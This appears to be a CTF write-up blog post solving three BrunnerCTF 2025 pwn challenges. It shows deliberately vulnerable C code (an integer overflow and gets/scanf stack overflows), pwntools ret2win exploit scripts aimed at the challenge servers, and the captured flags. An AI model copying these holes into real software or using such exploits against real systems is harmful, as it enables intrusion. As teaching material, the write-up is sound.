---
layout: post
title:  "BrunnerCTF 2025 Pwn Challenges"
date:   2025-08-24 22:07:10 -0400
author: robo.uzi
tags: [CTF, pwn]
---
* TOC
{:toc}

## Online Cake Flavour Shop
**Category:** Pwn

**Difficulty:** Beginner  
**Author:** olexmeister

Brunnerne made an online flavour shop! Your wildest dreams can be fulfilled, it's actually hard to **WRAP** your head **AROUND** how amazing this software is!
`nc cake-flavour-shop.challs.brunnerne.xyz 33000`

I am given the source code in `flag.c`:
```t
#include <stdio.h>  
#include <stdlib.h>  
  
#define FLAG_COST 100  
#define BRUNNER_COST 10  
#define CHOCOLATE_COST 7  
#define DRØMMEKAGE_COST 5  
  
  
int buy(int balance, int price) {  
   int qty;  
   printf("How many? ");  
   scanf("%u", &qty);  
  
   int cost = qty * price;  
   printf("price for your purchase: %d\n", cost);  
  
   if (cost <= balance) {  
       balance -= cost;  
       printf("You bought %d for $%d. Remaining: $%d\n", qty, cost, balance);  
   } else {  
       printf("You can't afford that!\n");  
   }  
  
   return balance;  
}  
  
void menu() {  
   printf("\nMenu:\n");  
   printf("1. Sample cake flavours\n");  
   printf("2. Check balance\n");  
   printf("3. Exit\n");  
   printf("> ");  
}  
  
unsigned int flavourMenu(unsigned int balance) {  
   unsigned int updatedBalance = balance;  
  
   printf("\nWhich flavour would you like to sample?:\n");  
   printf("1. Brunner ($%d)\n", BRUNNER_COST);  
   printf("2. Chocolate ($%d)\n", CHOCOLATE_COST);  
   printf("3. Drømmekage ($%d)\n", DRØMMEKAGE_COST);  
   printf("4. Flag Flavour ($%d)\n", FLAG_COST);  
   printf("> ");  
  
   int choice;  
   scanf("%d", &choice);  
  
   switch (choice)  
   {  
   case 1:  
       updatedBalance = buy(balance, BRUNNER_COST);  
       break;  
   case 2:  
       updatedBalance = buy(balance, CHOCOLATE_COST);  
       break;  
   case 3:  
       updatedBalance = buy(balance, DRØMMEKAGE_COST);  
       break;  
   case 4:  
       unsigned int flagBalance;  
       updatedBalance = buy(balance, FLAG_COST);  
       if (updatedBalance >= FLAG_COST) {  
           // Open file and print flag  
           FILE *fp = fopen("flag.txt", "r");  
           if(!fp) {  
               printf("Could not open flag file, please contact admin!\n");  
               exit(1);  
           }  
           char file[256];  
           size_t readBytes = fread(file, 1, sizeof(file), fp);  
           puts(file);  
       }  
       break;  
   default:  
       printf("Invalid choice.\n");  
       break;  
   }  
  
   return updatedBalance;  
}  
  
int main() {  
   int balance = 15;  
   int choice;  
  
   printf("Welcome to Overflowing Delights!\n");  
   printf("You have $%d.\n", balance);  
  
   while (1) {  
       menu();  
       scanf("%d", &choice);  
  
       switch (choice)  
       {  
       case 1:  
           balance = flavourMenu(balance);  
           break;  
       case 2:  
           printf("You have $%d.\n", balance);  
           break;  
       case 3:  
           printf("Goodbye!\n");  
           exit(0);  
           break;  
       default:  
           printf("Invalid choice.\n");  
           break;  
       }  
   }  
   return 0;  
}
```

```shell
nc cake-flavour-shop.challs.brunnerne.xyz 33000  
Welcome to Overflowing Delights!  
You have $15.  

Menu:  
1. Sample cake flavours  
2. Check balance  
3. Exit  
> 1  
  
Which flavour would you like to sample?:  
1. Brunner ($10)  
2. Chocolate ($7)  
3. Drømmekage ($5)  
4. Flag Flavour ($100)  
> 4  
How many? 42949672  
price for your purchase: -96  
You bought 42949672 for $-96. Remaining: $111  
brunner{wh0_kn3w_int3g3rs_c0uld_m4k3_y0u_rich}
```
The program calculates the cost like this: `int cost = qty * FLAG_COST;`

Both `qty` and `FLAG_COST` are 32 bit signed integers. When you enter 42949672, the multiplication overflows the 32 bit signed integer range. 32 bit signed integers go from -2,147,483,648 to 2,147,483,647. `42949672 * 100 = 4294967200`, which is much bigger than 2,147,483,647 so it wraps around to a negative number and gives the flag.

___

## Dat Overflow Dough
**Category:** Pwn

**Difficulty:** Beginner  
**Author:** 0xjeppe

Our new intern has only coded in memory safe languages, but we're trying to optimize, so he has been tasked with re-writing our dough recipe-application in C!

He sent his code to our senior dev for review who added some comments in the code. Upon receiving the reviewed code, the intern accidentally pushed it to production instead of fixing anything.

I am given a zip file with these files inside: `code_review.md`, `flag.txt`, `recipe`, and `recipe.c`. I see through manual testing that 24 characters cause the prompt to appear twice. 

The program reads input into a 16 byte buffer:
```t
// recipe.c  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <fcntl.h>  
  
void secret_dough_recipe(void) {  
   int fd = open("flag.txt", O_RDONLY);  
   sendfile(1, fd, NULL, 100);  
}  
  
void vulnerable_dough_recipe() {  
   char recipe[16];  
   puts("Please enter the name of the recipe you want to retrieve:");  
   // Using gets() here is NOT a good idea!! We are not checking the size of the input from the user!  
   // The recipe-buffer can only store 16 bytes and the user can input more than that. This could lead to buffer overflows.  
   // If an attacker has the address of the secret_dough_recipe function, they could exploit this vulnerability to see our secret recipe!!  
   gets(recipe);  
}  
  
void public_dough_recipe() {  
   puts("Here is the recipe for you!");  
   puts("3 eggs and some milk");  
}  
  
int main(void) {  
   setvbuf(stdout, NULL, _IONBF, 0);  
   vulnerable_dough_recipe();  
   puts("Enjoy baking!");  
   return 0;  
}
```

```shell
objdump -d recipe | grep secret_dough_recipe  
00000000004011b6 <secret_dough_recipe>:
```

I make my exploit script:
```python
from pwn import *

RECIPE_BUFFER_SIZE = 16
RBP_SIZE = 8
SECRET_ADDRESS = 0x4011b6
PROMPT = "Please enter the name of the recipe you want to retrieve:"

USE_REMOTE = True
REMOTE_HOST = "dat-overflow-dough-eda41b56b6b7081d.challs.brunnerne.xyz"
REMOTE_PORT = 443

if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./recipe")
    io = e.process()

payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```
 `A*16` fills the buffer. `B*8` overwrites RBP. `p64(0x4011b6)` overwrites the saved return address with the address of `secret_dough_recipe()`. When `vulnerable_dough_recipe()` returns, the instruction pointer (RIP) jumps to `secret_dough_recipe()` and returns the flag.
 
```shell
python3 solve.py  
[+] Opening connection to dat-overflow-dough-eda41b56b6b7081d.challs.brunnerne.xyz on port 443: Done  
[*] Switching to interactive mode  
  
brunner{b1n4ry_eXpLoiTatioN_iS_CooL}  
[*] Got EOF while reading in interactive
```

___

## Othello Villains
**Category:** Pwn

**Difficulty:** Easy  
**Author:** olexmeister

The Othello villains stole our sacred Brunner recipe! Luckily, they are unable to write secure code, please retrieve the recipe from their (in)secure vault!

I open the binary in ghidra. Here is the main fucntion:
```
undefined8 main(void)

{
  undefined local_28 [32];
  
  puts("Othello villains secret server. Do you know the password??\n");
  fflush(stdout);
  __isoc99_scanf(&DAT_00402044,local_28);
  return 0;
}
```
`local_28[32]`  is a 32 byte stack buffer. `__isoc99_scanf(&DAT_00402044, local_28);` reads user input. 

I use `pwntools` to make the exploit easier and test the exploit locally like this: 
```python
from pwn import *

binary = './othelloserver'

elf = ELF(binary)
win_addr = elf.symbols['win']

# 32 buffer + 8 RBP
offset = 40
payload = b'A' * offset + p64(win_addr)

p = process(binary)
p.sendline(payload)
p.interactive()
```

I use this script for the final remote exploit:
```python
from pwn import *

RECIPE_BUFFER_SIZE = 32
RBP_SIZE = 8
elf = ELF("./othelloserver")
WIN_ADDRESS = elf.symbols['win']

PROMPT = "Othello villains secret server. Do you know the password??"

USE_REMOTE = True
REMOTE_HOST = "othello-villains-b214b7732e27417d.challs.brunnerne.xyz"
REMOTE_PORT = 443

# Connect
if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    io = elf.process()

# Build payload
payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(WIN_ADDRESS)

io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```
`brunner{0th3ll0_is_inf3ri0r_t0_brunn3r}`

___

